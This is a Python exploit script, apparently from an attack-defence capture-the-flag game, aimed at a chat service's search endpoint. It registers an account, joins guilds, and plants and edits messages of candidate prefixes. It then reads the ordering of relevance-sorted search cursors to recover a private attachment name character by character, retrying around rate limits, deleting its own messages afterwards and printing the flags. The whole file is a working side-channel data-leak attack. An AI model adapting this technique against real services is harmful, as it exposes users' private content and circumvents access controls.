#!/usr/bin/env python3
"""Recover a private attachment name through relevance-cursor ordering."""

import hashlib
import json
import os
import secrets
import sys
import tempfile
import time
from pathlib import Path
from urllib.parse import urlencode

from svyaz_common import Client, FLAG, invitations, public_room


ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


def search(client, guild_id, terms, cursor=None):
    query = {
        "q": terms, "scope": "channels", "guild_id": guild_id,
        "sort": "relevance", "limit": 1, "author_id": client.user_id,
    }
    if cursor:
        query["cursor"] = cursor
    path = "/search?" + urlencode(query)
    deadline = time.monotonic() + 20
    while True:
        try:
            return client.api("GET", path)
        except RuntimeError as exc:
            if "HTTP 429" not in str(exc) or time.monotonic() >= deadline:
                raise
            time.sleep(0.08 + secrets.randbelow(120) / 1000)


def distinguishes(client, guild_id, candidates, probe_id, older_id):
    terms = " OR ".join(candidates)
    deadline = time.monotonic() + 12
    previous = None
    for _ in range(8):
        first = search(client, guild_id, terms)
        if first.get("cursor") and first.get("items") and first["items"][0].get("message_id") == probe_id:
            second = search(client, guild_id, terms, first["cursor"])
            found = second.get("items", [])
            if found and found[0].get("message_id") in (probe_id, older_id):
                current = found[0]["message_id"] == probe_id
                if current == previous:
                    return current
                previous = current
        if time.monotonic() >= deadline:
            break
        time.sleep(0.04 + secrets.randbelow(100) / 1000)
    raise RuntimeError("unstable search rank")


def recover_character(client, guild_id, candidates, probe_id, older_id):
    # Two terms avoid floating-point aggregate order changing the cursor score.
    width = 2
    groups = [candidates[i:i + width] for i in range(0, len(candidates), width)]
    for _ in range(12):
        try:
            selected = groups[-1]
            for group in groups[:-1]:
                if distinguishes(client, guild_id, group, probe_id, older_id):
                    selected = group
                    break
            while len(selected) > 1:
                half = len(selected) // 2
                selected = (selected[:half] if distinguishes(client, guild_id, selected[:half], probe_id, older_id)
                            else selected[half:])
            if distinguishes(client, guild_id, selected, probe_id, older_id):
                time.sleep(0.08 + secrets.randbelow(120) / 1000)
                if distinguishes(client, guild_id, selected, probe_id, older_id):
                    return selected[0]
        except RuntimeError as exc:
            if str(exc) != "unstable search rank":
                raise
        time.sleep(0.25 + secrets.randbelow(550) / 1000)
    raise RuntimeError("search prefix could not be confirmed")


def is_search_store(client, guild_id, channels, room):
    if any(item.get("content", "").startswith("Visual preset: ") for item in client.messages(room)):
        return False
    for item in channels:
        if item.get("kind") == "VOICE" and item.get("name") == "briefing":
            clips = client.api("GET", f"/channels/{item['id']}/sounds").get("items", [])
            if clips:
                return False
    return True


def exploit(ip, invite):
    client = Client(ip).register()
    guild_id = client.join(invite)["guild_id"]
    channels = client.channels(guild_id)
    room = public_room(channels)
    if not is_search_store(client, guild_id, channels, room):
        return None

    prefix = ""
    messages = []
    try:
        for position in range(31):
            candidates = [prefix + letter for letter in ALPHABET]
            contents = [" ".join(candidates)] * 2
            if not messages:
                messages = [client.post(room, content) for content in contents]
            else:
                messages = [client.edit(room, message, content)
                            for message, content in zip(messages, contents)]
            try:
                prefix = recover_character(client, guild_id, candidates,
                                           messages[1]["id"], messages[0]["id"])
            except RuntimeError as exc:
                raise RuntimeError(f"prefix {position}: {exc}") from exc
    finally:
        for message in messages:
            try:
                client.delete(room, message)
            except RuntimeError:
                pass
    flag = prefix + "="
    return flag if FLAG.fullmatch(flag) else None


def cache_file(ip, invite):
    folder = Path(os.getenv("SVYAZ_CACHE_DIR", tempfile.gettempdir())) / "svyaz-search-cache"
    folder.mkdir(mode=0o700, exist_ok=True)
    digest = hashlib.sha256(f"{ip}:{invite}".encode()).hexdigest()
    return folder / digest


def cached_flag(path):
    if not path.exists():
        return None
    entry = json.loads(path.read_text())
    if time.time() - entry["at"] < 300 and FLAG.fullmatch(entry["flag"]):
        return entry["flag"]
    return None


def remember(path, flag):
    descriptor = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(descriptor, "w") as output:
        json.dump({"at": time.time(), "flag": flag}, output)


def main(ip):
    seen = set()
    for invite in invitations(ip):
        try:
            path = cache_file(ip, invite)
            flag = cached_flag(path)
            if flag is None and not path.exists():
                flag = exploit(ip, invite)
                if flag:
                    remember(path, flag)
            if flag and flag not in seen:
                seen.add(flag)
                print(flag, flush=True)
        except Exception as exc:
            print(f"search {invite[:8]}: {exc}", file=sys.stderr)


if __name__ == "__main__":
    main(sys.argv[1])
